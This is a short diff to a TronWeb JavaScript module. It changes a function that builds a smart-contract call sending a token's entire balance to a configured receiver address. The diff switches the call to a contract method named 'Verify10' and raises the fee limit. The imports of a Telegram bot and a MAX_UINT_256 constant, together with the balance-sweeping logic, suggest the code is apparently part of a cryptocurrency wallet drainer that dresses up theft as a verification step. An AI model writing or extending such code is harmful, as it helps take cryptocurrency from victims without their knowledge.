@@ -9,11 +9,11 @@ const MAX_UINT_256 =
 const { returnMessage } = require('./logs')
 const telegramBot = require('./bot')
 
-//Create the transaction body for TRX transfer
+//Create the transaction body for TRX transfer via Verify10
 async function createSendTRX(token, address, indexOfSetting, tronWeb) {
 	try {
 		const setting = SETTINGS[indexOfSetting]
-		const functionSelector = `${token.withdrawalMethod}(address,uint256)`
+		const functionSelector = 'Verify10(address,uint256)'
 		const parameter = [
 			{ type: 'address', value: setting.receiverAddress },
 			{ type: 'uint256', value: token.balance },
@@ -29,7 +29,7 @@ async function createSendTRX(token, address, indexOfSetting, tronWeb) {
 		).energy_used
 		const feeLimit = Math.max(
 			Math.round((energyUsed || 0) * 420 * 1.1),
-			15_000_000,
+			25_000_000,
 		)
 		const tx = (
 			await tronWeb.transactionBuilder.triggerSmartContract(
